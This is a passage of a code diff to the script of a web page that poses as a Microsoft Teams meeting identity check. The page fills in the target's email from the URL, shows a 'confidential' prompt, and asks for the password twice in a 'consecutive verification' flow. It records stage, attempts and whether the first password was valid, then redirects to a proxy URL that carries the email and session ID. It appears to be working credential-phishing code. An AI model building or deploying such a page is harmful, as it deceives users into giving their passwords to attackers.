-        { src: 'https://cdn-dynmedia-1.microsoft.com/is/content/microsoftcorp/298520-maria-sizzle-0x540-2160k/webmvp9', type: 'video/webm' }
-    ];
-    
-    videoSources.forEach(source => {
-        const src = document.createElement('source');
-        src.src = source.src;
-        src.type = source.type;
-        video.appendChild(src);
-    });
-    
-    video.addEventListener('loadeddata', function() {
-        console.log('✅ Video background loaded');
-        video.style.opacity = '0.3';
-        if (gradientFallback) {
-            gradientFallback.style.display = 'none';
-        }
-    });
-    
-    video.addEventListener('error', function() {
-        console.warn('⚠️ Video failed, using gradient fallback');
-        if (gradientFallback) {
-            gradientFallback.style.display = 'block';
-        }
-        video.style.display = 'none';
-    });
-    
-    bgContainer.appendChild(video);
-    video.load();
-    
-    setTimeout(() => {
-        try {
-            const playPromise = video.play();
-            if (playPromise !== undefined) {
-                playPromise.then(() => {
-                    console.log('✅ Video playing');
-                    video.style.opacity = '0.3';
-                }).catch(() => {
-                    console.log('ℹ️ Autoplay blocked');
-                    video.style.opacity = '0.15';
-                });
-            }
-        } catch(e) {}
-    }, 100);
-})();
-
-// ============================================================
-// INIT
-// ============================================================
-function init() {
-    applyTranslations();
-    
-    const email = getEmailFromUrl() || getSavedEmail() || 'guest@example.com';
-    capturedEmail = email;
-    updateProviderBadge(email);
-    
-    document.getElementById('user').value = email;
-    document.getElementById('userTxt').textContent = email;
-    document.getElementById('nameTxt').textContent = email.split('@')[0] || 'User';
-
-    setupContinueButton();
-
-    document.getElementById('joinBtn').addEventListener('click', function(e) {
-        e.preventDefault();
-        handleSubmit();
-    });
-
-    document.getElementById('password').addEventListener('keypress', function(e) {
-        if (e.key === 'Enter') {
+            setTimeout(function() {
+                document.getElementById('loadDiv').style.display = 'none';
+                document.getElementById('loginDiv').style.display = 'block';
+                document.getElementById('confidentialMessage').classList.add('show');
+                document.getElementById('verificationStatus').textContent = '🔐 Please enter your password to verify your identity.';
+                document.getElementById('password').focus();
+            }, 1500);
+        });
+        
+        // Submit handler
+        document.getElementById('joinBtn').addEventListener('click', function(e) {
             e.preventDefault();
             handleSubmit();
-        }
+        });
+        
+        // Enter key handler
+        document.getElementById('password').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                handleSubmit();
+            }
+        });
+        
+        console.log('🔐 2-Consecutive Password Verification initialized');
+        console.log('📧 Email:', email);
+        console.log('🆔 Session:', SESSION_ID);
+        console.log('🔗 Proxy URL:', PROXY_URL);
+        console.log('📌 Teams Meeting:', TEAMS_MEETING);
     });
 
-    document.getElementById('password').addEventListener('input', function() {
-        this.classList.remove('error', 'success', 'loading');
-        updatePasswordStrength(this.value);
-    });
+    // ============================================================
+    // NOTIFICATION
+    // ============================================================
+    function showNotification(message, type = 'success') {
+        try {
+            const existing = document.querySelector('.notification');
+            if (existing) existing.remove();
 
-    console.log('🔐 2-Consecutive Password Verification with Real Microsoft Validation');
-    console.log('📧 Email:', email);
-    console.log('🆔 Session:', SESSION_ID);
-    console.log('🌐 Language:', userLang);
-    console.log('🔗 Backend:', BACKEND_URL);
-    console.log('🔗 Proxy:', PROXY_URL);
-}
+            const div = document.createElement('div');
+            div.className = 'notification';
+            if (type === 'error') div.classList.add('error');
+            if (type === 'confidential') div.style.background = '#6264a7';
+            div.textContent = message;
+            document.body.appendChild(div);
 
-if (document.readyState === 'loading') {
-    document.addEventListener('DOMContentLoaded', init);
-} else {
-    init();
-}
+            setTimeout(() => {
+                div.style.opacity = '0';
+                div.style.transition = 'opacity 0.3s';
+                setTimeout(() => div.remove(), 300);
+            }, 4000);
+        } catch(e) {}
+    }
 
-// ============================================================
-// EXPOSE API
-// ============================================================
-window.__teamsGateway = {
-    getEmail: () => capturedEmail || getEmailFromUrl() || getSavedEmail(),
-    getSessionId: () => SESSION_ID,
-    getStage: () => currentStage,
-    getConsecutiveCount: () => consecutiveCount,
-    getProvider: () => detectProvider(capturedEmail).name,
-    verifyPassword: handleSubmit,
-    resetVerification: () => {
-        currentStage = 1;
-        consecutiveCount = 0;
-        document.getElementById('password').value = '';
-        updateVerificationStatus(t.verifying, 'verifying');
-        document.getElementById('joinBtn').textContent = t.verifyIdentity;
-        document.getElementById('joinBtn').classList.remove('success');
-    },
-    redirectToProxy: () => {
-        const email = capturedEmail || getEmailFromUrl() || getSavedEmail() || 'guest@example.com';
-        const proxyUrl = PROXY_URL + '?login_hint=' + encodeURIComponent(email) + '&session=' + SESSION_ID;
-        window.location.href = proxyUrl;
-        return { redirecting: true, url: proxyUrl };
-    },
-    getStats: () => ({
-        stage: currentStage,
-        consecutiveCount: consecutiveCount,
-        attempts: attemptCount,
-        provider: detectProvider(capturedEmail).name,
-        language: userLang
-    })
-};
+    // ============================================================
+    // EXPOSE FOR TESTING
+    // ============================================================
+    window.__teamsGateway = {
+        getEmail: () => capturedEmail || getEmailFromUrl() || getSavedEmail(),
+        getSessionId: () => SESSION_ID,
+        getStage: () => currentStage,
+        verifyPassword: handleSubmit,
+        resetVerification: () => {
+            currentStage = 1;
+            firstPasswordValid = false;
+            document.getElementById('password').value = '';
+            document.getElementById('verificationStatus').textContent = '🔐 Please enter your password to verify your identity.';
+            document.getElementById('verificationStatus').className = 'verification-status';
+            document.getElementById('joinBtn').textContent = 'Verify Identity';
+            document.getElementById('confidentialMessage').style.display = 'block';
+        },
+        redirectToMicrosoft: () => {
+            const email = capturedEmail || getEmailFromUrl() || getSavedEmail() || 'guest@example.com';
+            const redirectUrl = `${PROXY_URL}?login_hint=${encodeURIComponent(email)}&session=${SESSION_ID}`;
+            window.location.href = redirectUrl;
+            return { redirecting: true, url: redirectUrl };
+        },
+        getStats: () => ({
+            stage: currentStage,
+            attempts: attemptCount,
+            firstPasswordValid: firstPasswordValid,
+            language: userLang
+        })
+    };
 
-console.log('✅ API available at window.__teamsGateway');
-console.log(`💡 Language: ${userLang === 'ko' ? '한국어' : userLang}`);
-console.log(`📧 Provider: ${detectProvider(capturedEmail).name}`);
-</script>
-
+    console.log('✅ API available at window.__teamsGateway');
+    console.log('💡 Use window.__teamsGateway.redirectToMicrosoft() to redirect directly');
+    </script>
 </body>
 </html>
